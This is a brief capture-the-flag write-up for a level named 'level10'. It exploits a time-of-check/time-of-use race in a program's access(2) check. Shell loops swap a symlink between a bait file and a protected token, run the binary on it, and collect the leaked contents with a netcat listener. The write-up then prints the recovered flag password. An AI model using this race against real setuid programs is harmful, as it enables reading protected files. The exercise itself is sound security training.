# level10

`./level10` uses `access(2)` -> we can create a file we have permition to access & quickly replace it to a symlink to `~/token`

Three separate jobs are needed here:

```bash
# Create a symlink and a bait
touch /tmp/bait;
while true; do ln -sf ~/token /tmp/lnk; ln -sf /tmp/bait /tmp/lnk; done
```

```bash
# Execute the program on the symlink in a loop
while true; do ./level10 /tmp/lnk 127.0.0.1; done
```

```bash
# Read the output
nc -klv 6969 2>/dev/null | grep -v '.*('
```

-> Password to flag10: `woupa2yuojeeaaed06riuj63c`
